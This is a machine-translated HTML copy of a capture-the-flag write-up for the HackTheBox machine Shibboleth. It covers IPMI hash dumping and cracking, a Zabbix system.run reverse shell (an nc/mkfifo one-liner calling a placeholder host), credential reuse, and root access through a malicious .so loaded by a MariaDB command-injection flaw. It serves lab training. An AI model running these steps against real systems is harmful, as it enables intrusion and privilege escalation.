<html>
<head>
<title>Hacking IPMI and Zabbix in HackTheBox — Shibboleth</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">黑客IPMI和扎比克斯在HackTheBox-Shibboleth</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/hacking-ipmi-and-zabbix-in-hackthebox-shibboleth-e48c4f235faf?source=collection_archive---------0-----------------------#2022-04-27">https://infosecwriteups.com/hacking-ipmi-and-zabbix-in-hackthebox-shibboleth-e48c4f235faf?source=collection_archive---------0-----------------------#2022-04-27</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><figure class="gl gn jo jp jq jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi jn"><img src="../Images/8ae42fefe8bb7e020dc2c2f6a517fda2.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*PTft7givWyB1L9cav7nrZw.png"/></div></div></figure><h1 id="1bb6" class="jy jz iq bd ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv bi translated">端口扫描</h1><p id="d296" class="pw-post-body-paragraph kw kx iq ky b kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt ij bi translated"><strong class="ky ir"> TCP </strong></p><figure class="lu lv lw lx gt jr"><div class="bz fp l di"><div class="ly lz l"/></div></figure><p id="d267" class="pw-post-body-paragraph kw kx iq ky b kz ma lb lc ld mb lf lg lh mc lj lk ll md ln lo lp me lr ls lt ij bi translated">将<code class="fe mf mg mh mi b">shibboleth.htb</code>添加到<code class="fe mf mg mh mi b">/etc/hosts</code>文件。</p><p id="a97c" class="pw-post-body-paragraph kw kx iq ky b kz ma lb lc ld mb lf lg lh mc lj lk ll md ln lo lp me lr ls lt ij bi translated"><strong class="ky ir"> UDP </strong></p><figure class="lu lv lw lx gt jr"><div class="bz fp l di"><div class="ly lz l"/></div></figure><p id="dc89" class="pw-post-body-paragraph kw kx iq ky b kz ma lb lc ld mb lf lg lh mc lj lk ll md ln lo lp me lr ls lt ij bi translated">找到的其他港口都在<code class="fe mf mg mh mi b">open|filtered</code>州，我没有把它们包括在结果中。</p><h1 id="66cf" class="jy jz iq bd ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv bi translated"><strong class="ak">网络服务器枚举</strong></h1><h2 id="1105" class="mj jz iq bd ka mk ml dn ke mm mn dp ki lh mo mp km ll mq mr kq lp ms mt ku mu bi translated">虚拟主机扫描</h2><p id="be54" class="pw-post-body-paragraph kw kx iq ky b kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt ij bi translated">我们将使用<code class="fe mf mg mh mi b">ffuf</code>来执行vhost扫描。</p><pre class="lu lv lw lx gt mv mi mw mx aw my bi"><span id="cb87" class="mj jz iq mi b gy mz na l nb nc">ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -o ffuf-vhosts.out -u <a class="ae nd" href="http://shibboleth.htb" rel="noopener ugc nofollow" target="_blank">http://shibboleth.htb</a> -H -fw 18</span></pre><p id="c3e7" class="pw-post-body-paragraph kw kx iq ky b kz ma lb lc ld mb lf lg lh mc lj lk ll md ln lo lp me lr ls lt ij bi translated">找到虚拟主机:</p><ul class=""><li id="8587" class="ne nf iq ky b kz ma ld mb lh ng ll nh lp ni lt nj nk nl nm bi translated">班长</li><li id="3051" class="ne nf iq ky b kz nn ld no lh np ll nq lp nr lt nj nk nl nm bi translated">监视</li><li id="8634" class="ne nf iq ky b kz nn ld no lh np ll nq lp nr lt nj nk nl nm bi translated">扎比克斯</li></ul><p id="4c26" class="pw-post-body-paragraph kw kx iq ky b kz ma lb lc ld mb lf lg lh mc lj lk ll md ln lo lp me lr ls lt ij bi translated">这三个虚拟主机把我们带到了同一个页面。它是一个名为<strong class="ky ir"> Zabbix的监控工具。</strong></p><p id="fe49" class="pw-post-body-paragraph kw kx iq ky b kz ma lb lc ld mb lf lg lh mc lj lk ll md ln lo lp me lr ls lt ij bi translated">Zabbix的v5.0有一个认证旁路，但是它不能在服务器上的Zabbix应用程序中使用。我们走进了死胡同。</p><h1 id="b9b1" class="jy jz iq bd ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv bi translated">UDP端口623</h1><p id="d122" class="pw-post-body-paragraph kw kx iq ky b kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt ij bi translated">在谷歌上快速搜索UDP端口623时，我发现了IPMI(智能平台管理接口)协议和基板管理控制器(BMC)。查看这些资源以进一步了解:</p><ul class=""><li id="ba40" class="ne nf iq ky b kz ma ld mb lh ng ll nh lp ni lt nj nk nl nm bi translated"><a class="ae nd" href="https://www.rapid7.com/blog/post/2013/07/02/a-penetration-testers-guide-to-ipmi/" rel="noopener ugc nofollow" target="_blank">https://www . rapid 7 . com/blog/post/2013/07/02/a-penetration-testers-guide-to-IPMI</a></li><li id="7bf0" class="ne nf iq ky b kz nn ld no lh np ll nq lp nr lt nj nk nl nm bi translated"><a class="ae nd" href="https://book.hacktricks.xyz/pentesting/623-udp-ipmi" rel="noopener ugc nofollow" target="_blank">https://book.hacktricks.xyz/pentesting/623-udp-ipmi</a></li></ul><p id="13b6" class="pw-post-body-paragraph kw kx iq ky b kz ma lb lc ld mb lf lg lh mc lj lk ll md ln lo lp me lr ls lt ij bi translated">我启动了metasploit来使用它的ipmi模块</p><figure class="lu lv lw lx gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi ns"><img src="../Images/89aed8e70613ed51fe21c4a85eb25186.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*BGRkllMERdDz_u1C.png"/></div></div></figure><p id="c6e4" class="pw-post-body-paragraph kw kx iq ky b kz ma lb lc ld mb lf lg lh mc lj lk ll md ln lo lp me lr ls lt ij bi translated">我们发现了一个管理哈希</p><pre class="lu lv lw lx gt mv mi mw mx aw my bi"><span id="5a58" class="mj jz iq mi b gy mz na l nb nc">Administrator:836b54da82180000cffc521f48855e4dc4c55663cafc675e4719b43992d8faadc55b2cb9fd8c2d5fa123456789abcdefa123456789abcdef140d41646d696e6973747261746f72:3c62b4109945ae35ba1998f6348ac490bbad6a65</span></pre><p id="879b" class="pw-post-body-paragraph kw kx iq ky b kz ma lb lc ld mb lf lg lh mc lj lk ll md ln lo lp me lr ls lt ij bi translated">以hashcat格式保存输出(通过设置正确的选项并重新运行漏洞)，并使用hashcat来破解散列</p><pre class="lu lv lw lx gt mv mi mw mx aw my bi"><span id="042f" class="mj jz iq mi b gy mz na l nb nc">.\hashcat.exe -D2 -m 7300 .\passwords\shibboleth-ipmi.txt .\rockyou.txt</span></pre><p id="b8fb" class="pw-post-body-paragraph kw kx iq ky b kz ma lb lc ld mb lf lg lh mc lj lk ll md ln lo lp me lr ls lt ij bi translated">破解密码:<code class="fe mf mg mh mi b"><strong class="ky ir">ilovepumk******</strong></code></p><p id="d2cb" class="pw-post-body-paragraph kw kx iq ky b kz ma lb lc ld mb lf lg lh mc lj lk ll md ln lo lp me lr ls lt ij bi translated">使用密码以<code class="fe mf mg mh mi b">Administrator</code>的身份登录Zabbix门户网站。</p><h1 id="9f26" class="jy jz iq bd ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv bi translated">Zabbix门户网站</h1><p id="aa87" class="pw-post-body-paragraph kw kx iq ky b kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt ij bi translated">我看到不同的文章/博客讨论了通过Zabbix利用API通过<code class="fe mf mg mh mi b">/api_jsonrpc.php</code>的问题，但是所有对该端点的请求都返回了403禁止状态代码。</p><figure class="lu lv lw lx gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi ns"><img src="../Images/2338373172c5ef23e40bd3a9a4e1485b.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*TRdbZPjxAbat_9YM.png"/></div></div></figure><p id="9502" class="pw-post-body-paragraph kw kx iq ky b kz ma lb lc ld mb lf lg lh mc lj lk ll md ln lo lp me lr ls lt ij bi translated">我检查了其他在系统上获得shell的方法…在Zabbix控制台中，进入Configuration = &gt; Hosts = &gt; shibboleth . htb，我们有许多不同的页面，其中一个是<code class="fe mf mg mh mi b">Items</code>。它包含不同的命令及其各自的键。让我们创建一个项目来查看所有可用的项目:</p><figure class="lu lv lw lx gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi ns"><img src="../Images/d3a56735ec9ef345a145b85dd30761c3.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*c244p1kj5Dk1VWoX.png"/></div></div></figure><p id="de8a" class="pw-post-body-paragraph kw kx iq ky b kz ma lb lc ld mb lf lg lh mc lj lk ll md ln lo lp me lr ls lt ij bi translated">有一个叫<code class="fe mf mg mh mi b">system.run[command,&lt;mode&gt;]</code>的特定键看起来很有意思。它允许我们在主机上运行命令。我们可以让RCE加入这个系统。</p><p id="d4cd" class="pw-post-body-paragraph kw kx iq ky b kz ma lb lc ld mb lf lg lh mc lj lk ll md ln lo lp me lr ls lt ij bi translated">通读https://www.zabbix.com/documentation/5.0/manual<a class="ae nd" href="https://www.zabbix.com/documentation/5.0/manual" rel="noopener ugc nofollow" target="_blank">的文档，我知道我们只需要如下设置密钥，并测试我们的反向外壳是否工作:</a></p><p id="9fd2" class="pw-post-body-paragraph kw kx iq ky b kz ma lb lc ld mb lf lg lh mc lj lk ll md ln lo lp me lr ls lt ij bi translated">首先在端口1337设置一个netcat监听器，并按如下方式设置密钥:</p><pre class="lu lv lw lx gt mv mi mw mx aw my bi"><span id="00fb" class="mj jz iq mi b gy mz na l nb nc">system.run[rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1 |nc YOUR_IP_HERE 1337 &gt;/tmp/f, nowait]</span></pre><p id="44b3" class="pw-post-body-paragraph kw kx iq ky b kz ma lb lc ld mb lf lg lh mc lj lk ll md ln lo lp me lr ls lt ij bi translated">将需要第二个参数<code class="fe mf mg mh mi b">nowait</code>(默认设置为<code class="fe mf mg mh mi b">wait</code>)。如果没有这个参数，外壳会立即掉落。</p><figure class="lu lv lw lx gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi ns"><img src="../Images/11684f4e95f658960093e85938d7e700.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*Tflutz8S9O2bcYpv.png"/></div></div></figure><h1 id="1e3d" class="jy jz iq bd ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv bi translated">作为zabbix用户的Shell</h1><p id="c0ec" class="pw-post-body-paragraph kw kx iq ky b kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt ij bi translated">现在我们已经在系统上有了一个shell，作为<code class="fe mf mg mh mi b">zabbix</code>用户，让我们列举一下这个系统。还有一个用户账号<code class="fe mf mg mh mi b">ipmi-svc</code>。我们需要将我们的权限提升给该用户，以获得用户标志。我搜索了各种东西，如配置文件、以其他用户身份在系统上运行的进程等，但找不到任何有用的东西，因此陷入了死胡同。然后我看到了ipmi的配置文件，其中存储了用户的凭证。</p><figure class="lu lv lw lx gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi ns"><img src="../Images/f9ec74070b6b807ed19c3e868f2dfab8.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*wBiU-aLB3v4ZIrjt.png"/></div></div></figure><p id="d8b2" class="pw-post-body-paragraph kw kx iq ky b kz ma lb lc ld mb lf lg lh mc lj lk ll md ln lo lp me lr ls lt ij bi translated">虽然它和我之前发现的密码一样，但是我没有尝试在<code class="fe mf mg mh mi b">ipmi-svc</code>用户身上重复使用这个密码。现在让我们试试:)</p><p id="ade9" class="pw-post-body-paragraph kw kx iq ky b kz ma lb lc ld mb lf lg lh mc lj lk ll md ln lo lp me lr ls lt ij bi translated">密码对用户有效，我们得到一个外壳<code class="fe mf mg mh mi b">ipmi-svc</code>。</p><h1 id="0b82" class="jy jz iq bd ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv bi translated">作为ipmi-svc用户的Shell</h1><p id="b089" class="pw-post-body-paragraph kw kx iq ky b kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt ij bi translated">我以这个用户的身份再次在系统上开始枚举，并发现了一个有趣的文件，它属于组<code class="fe mf mg mh mi b">ipmi-svc</code>。这是zabbix服务器的配置文件。</p><figure class="lu lv lw lx gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi ns"><img src="../Images/ac381506bf5192df7ed649e8d7279aa9.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*OSpsofk1F8xsm824.png"/></div></div></figure><p id="0ea2" class="pw-post-body-paragraph kw kx iq ky b kz ma lb lc ld mb lf lg lh mc lj lk ll md ln lo lp me lr ls lt ij bi translated">它包含数据库凭据。</p><p id="7c8a" class="pw-post-body-paragraph kw kx iq ky b kz ma lb lc ld mb lf lg lh mc lj lk ll md ln lo lp me lr ls lt ij bi translated">我检查了数据库和表格中的任何密码哈希，发现了一些河豚哈希。</p><figure class="lu lv lw lx gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi ns"><img src="../Images/960778daf288c3a8f06df33ced5df7ab.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*hDQm1cMGiMuAwIib.png"/></div></div></figure><p id="c27e" class="pw-post-body-paragraph kw kx iq ky b kz ma lb lc ld mb lf lg lh mc lj lk ll md ln lo lp me lr ls lt ij bi translated">但是我不能破解任何哈希:(</p><p id="dddd" class="pw-post-body-paragraph kw kx iq ky b kz ma lb lc ld mb lf lg lh mc lj lk ll md ln lo lp me lr ls lt ij bi translated">是时候向前看了。</p><h1 id="821c" class="jy jz iq bd ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv bi translated">壳作为根</h1><p id="cdc5" class="pw-post-body-paragraph kw kx iq ky b kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt ij bi translated">我回去再次列举系统，但找不到任何有用的东西。我决定跳回SQL登录，我想到的一件事是检查数据库的版本，看看它是否有漏洞。</p><figure class="lu lv lw lx gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi nt"><img src="../Images/9ef7d69f190cb1ce71fef0abb9080981.png" data-original-src="https://miro.medium.com/v2/resize:fit:1392/format:webp/0*cak70rvwlyPOSgWW.png"/></div></div></figure><p id="b420" class="pw-post-body-paragraph kw kx iq ky b kz ma lb lc ld mb lf lg lh mc lj lk ll md ln lo lp me lr ls lt ij bi translated">MariaDB版本<code class="fe mf mg mh mi b">10.3.25-MariaDB-0ubuntu0.20.04.1</code></p><p id="5c62" class="pw-post-body-paragraph kw kx iq ky b kz ma lb lc ld mb lf lg lh mc lj lk ll md ln lo lp me lr ls lt ij bi translated">此版本的MariaDB易受操作系统命令注入漏洞的攻击。我在这里发现了一个漏洞<a class="ae nd" href="https://packetstormsecurity.com/files/162177/MariaDB-10.2-Command-Execution.html" rel="noopener ugc nofollow" target="_blank">https://packets storm security . com/files/162177/Maria db-10.2-Command-execution . html</a></p><p id="ece1" class="pw-post-body-paragraph kw kx iq ky b kz ma lb lc ld mb lf lg lh mc lj lk ll md ln lo lp me lr ls lt ij bi translated">针对此漏洞，我们需要创建一个恶意的共享对象文件(<code class="fe mf mg mh mi b">.so</code>)文件。我们将使用msfvenom来设计我们的漏洞。步骤如下所示:</p><figure class="lu lv lw lx gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi nu"><img src="../Images/3eaaf8a0974fc32b69e8fdbbd823e914.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*gjLPOoV31uJy2frG.png"/></div></div></figure><p id="0f25" class="pw-post-body-paragraph kw kx iq ky b kz ma lb lc ld mb lf lg lh mc lj lk ll md ln lo lp me lr ls lt ij bi translated">将恶意的<code class="fe mf mg mh mi b">test.so</code>文件转移到shibboleth机器上。在本地机器上设置一个监听器并登录到mysql:</p><pre class="lu lv lw lx gt mv mi mw mx aw my bi"><span id="48b1" class="mj jz iq mi b gy mz na l nb nc">mysql -u zabbix -p -e 'SET GLOBAL wsrep_provider="/dev/shm/test.so";'</span></pre><figure class="lu lv lw lx gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi nv"><img src="../Images/ad880956fcc9d774390256b2f69fcdc1.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*jgbiwjOGVTAW_bPN.png"/></div></div></figure><p id="884b" class="pw-post-body-paragraph kw kx iq ky b kz ma lb lc ld mb lf lg lh mc lj lk ll md ln lo lp me lr ls lt ij bi translated">并且…我们得到一个shell作为根:)</p><h1 id="3e9c" class="jy jz iq bd ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv bi translated">超越根</h1><p id="179d" class="pw-post-body-paragraph kw kx iq ky b kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt ij bi translated">我想用一个简短的beyond root部分来结束这篇文章，这是我从<a class="ae nd" href="https://twitter.com/0xdf_" rel="noopener ugc nofollow" target="_blank"> @0xdf_ </a>的Beyond Root视频中获得的灵感(你绝对应该看看<a class="ae nd" href="https://www.youtube.com/c/0xdf0xdf" rel="noopener ugc nofollow" target="_blank">他的YouTube频道</a>)。我决定为这个盒子做一点超越根的部分。我们将重温之前我们看到的,<code class="fe mf mg mh mi b">/api_jsonrpc.php</code>处的Zabbix API端点以403禁止状态码响应的部分。这阻止了我们使用它的API端点。让我们检查位于<code class="fe mf mg mh mi b">/etc/apache2/sites-enabled/000-default.conf</code>的apache vhost配置文件。</p><figure class="lu lv lw lx gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi nw"><img src="../Images/d6589cd7bf5b565d7747c5558ce3b5fb.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*9cfwl6Vm9xXE7oSE.png"/></div></div></figure><p id="1964" class="pw-post-body-paragraph kw kx iq ky b kz ma lb lc ld mb lf lg lh mc lj lk ll md ln lo lp me lr ls lt ij bi translated">我们看到，对于Zabbix vHost，这些端点被设置为拒绝来自所有主机的连接。</p><p id="f192" class="pw-post-body-paragraph kw kx iq ky b kz ma lb lc ld mb lf lg lh mc lj lk ll md ln lo lp me lr ls lt ij bi translated">从Apache文档中，</p><blockquote class="nx ny nz"><p id="805d" class="kw kx oa ky b kz ma lb lc ld mb lf lg ob mc lj lk oc md ln lo od me lr ls lt ij bi translated"><em class="iq"/><code class="fe mf mg mh mi b"><em class="iq">&lt;Location&gt;</em></code><em class="iq">指令通过URL </em>限制了所包含指令的范围</p></blockquote><p id="9780" class="pw-post-body-paragraph kw kx iq ky b kz ma lb lc ld mb lf lg lh mc lj lk ll md ln lo lp me lr ls lt ij bi translated">因此，在框中的配置文件中，它用于仅为设置的端点显式指定配置。在Location指令中，我们还有三个指令集:</p><ul class=""><li id="a5f3" class="ne nf iq ky b kz ma ld mb lh ng ll nh lp ni lt nj nk nl nm bi translated">命令</li><li id="9071" class="ne nf iq ky b kz nn ld no lh np ll nq lp nr lt nj nk nl nm bi translated">否认</li><li id="f36b" class="ne nf iq ky b kz nn ld no lh np ll nq lp nr lt nj nk nl nm bi translated">允许</li></ul><p id="a971" class="pw-post-body-paragraph kw kx iq ky b kz ma lb lc ld mb lf lg lh mc lj lk ll md ln lo lp me lr ls lt ij bi translated">这些用于控制对服务器特定部分的访问。根据客户端的特征(如主机名和IP地址)来控制访问。Allow和Deny指令指定哪些客户端可以或不可以访问服务器。Order指令设置默认访问状态，并配置Allow和Deny指令如何相互交互。</p><p id="a152" class="pw-post-body-paragraph kw kx iq ky b kz ma lb lc ld mb lf lg lh mc lj lk ll md ln lo lp me lr ls lt ij bi translated">需要注意的一点是，这些行在配置文件中出现的顺序并不重要。所有允许和拒绝行都作为单独的组进行处理。然而，Order指令本身的顺序是很重要的。<code class="fe mf mg mh mi b">Order deny,allow</code>不同于<code class="fe mf mg mh mi b">Order allow,deny</code>。</p><p id="69a5" class="pw-post-body-paragraph kw kx iq ky b kz ma lb lc ld mb lf lg lh mc lj lk ll md ln lo lp me lr ls lt ij bi translated">在第一个示例中，首先处理所有的拒绝指令。如果请求主机匹配，除非它也匹配Allow指令，否则将被拒绝。允许不匹配任何Allow或Deny指令任何其他请求。</p><p id="7422" class="pw-post-body-paragraph kw kx iq ky b kz ma lb lc ld mb lf lg lh mc lj lk ll md ln lo lp me lr ls lt ij bi translated">在后一种情况下，首先处理所有的Allow指令。要被允许，请求客户端的主机必须至少与其中一个匹配。否则，该请求将被拒绝。然后处理所有拒绝指令。如果有任何匹配，该请求也会被拒绝。默认情况下，不匹配任何Allow或Deny指令任何其他请求都会被拒绝。</p><p id="d777" class="pw-post-body-paragraph kw kx iq ky b kz ma lb lc ld mb lf lg lh mc lj lk ll md ln lo lp me lr ls lt ij bi translated">所以根据Shibboleth框中的配置，</p><pre class="lu lv lw lx gt mv mi mw mx aw my bi"><span id="cb0c" class="mj jz iq mi b gy mz na l nb nc">Order deny,allow <br/>Deny from all <br/>Allow from 127.0.0.1</span></pre><p id="d2ac" class="pw-post-body-paragraph kw kx iq ky b kz ma lb lc ld mb lf lg lh mc lj lk ll md ln lo lp me lr ls lt ij bi translated">顺序是<code class="fe mf mg mh mi b">deny,allow</code>。因此将首先处理拒绝指令。这里，<strong class="ky ir">所有的</strong>请求都将被拒绝，除非是来自<strong class="ky ir"> 127.0.0.1 </strong>的请求将被允许。</p><p id="a19f" class="pw-post-body-paragraph kw kx iq ky b kz ma lb lc ld mb lf lg lh mc lj lk ll md ln lo lp me lr ls lt ij bi translated">希望您在这个超越根的部分学到了一些新东西。</p><p id="0dbd" class="pw-post-body-paragraph kw kx iq ky b kz ma lb lc ld mb lf lg lh mc lj lk ll md ln lo lp me lr ls lt ij bi translated">下期再见:)</p></div><div class="ab cl oe of hu og" role="separator"><span class="oh bw bk oi oj ok"/><span class="oh bw bk oi oj ok"/><span class="oh bw bk oi oj"/></div><div class="ij ik il im in"><p id="060a" class="pw-post-body-paragraph kw kx iq ky b kz ma lb lc ld mb lf lg lh mc lj lk ll md ln lo lp me lr ls lt ij bi translated"><em class="oa">最初发表于</em><a class="ae nd" href="https://github.com/xplo1t-sec/CTF/blob/master/HackTheBox/machines/Shibboleth/README.md" rel="noopener ugc nofollow" target="_blank"><em class="oa">【https://github.com】</em></a><em class="oa">。</em></p></div></div>    
</body>
</html>